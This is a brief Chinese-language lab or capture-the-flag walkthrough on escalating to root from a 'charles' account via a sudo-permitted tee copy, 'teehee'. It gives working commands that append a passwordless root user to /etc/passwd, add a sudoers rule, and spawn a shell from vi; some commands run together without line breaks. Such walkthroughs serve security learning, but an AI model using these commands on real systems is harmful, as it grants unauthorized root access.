提权

拿到charles账号通过ssh登录后，执行sudo -l可以发现存在teehee，执行tee --help发现能追加文件内容，也就是说，| sudo teehee -a等价于 >>，于是有两种方法进行提权： 


方法一：往/etc/passwd写入一个免密的 root 权限用户。

echo "Tuzk1::0:0:::/bin/bash" | sudo teehee -a /etc/passwdsu Tuzk1


方法二：写入/etc/sudoers，让 charles 获得免密执行 sudo 其他命令的权限，charles 可以在任何地方获得等同root的权限执行 任何命令。

echo "charles ALL=(root) ALL" | sudo teehee -a /etc/sudoers# sudo vi提权vi privilege.txt# 输入charles的密码，然后输入：:!/bin/bash
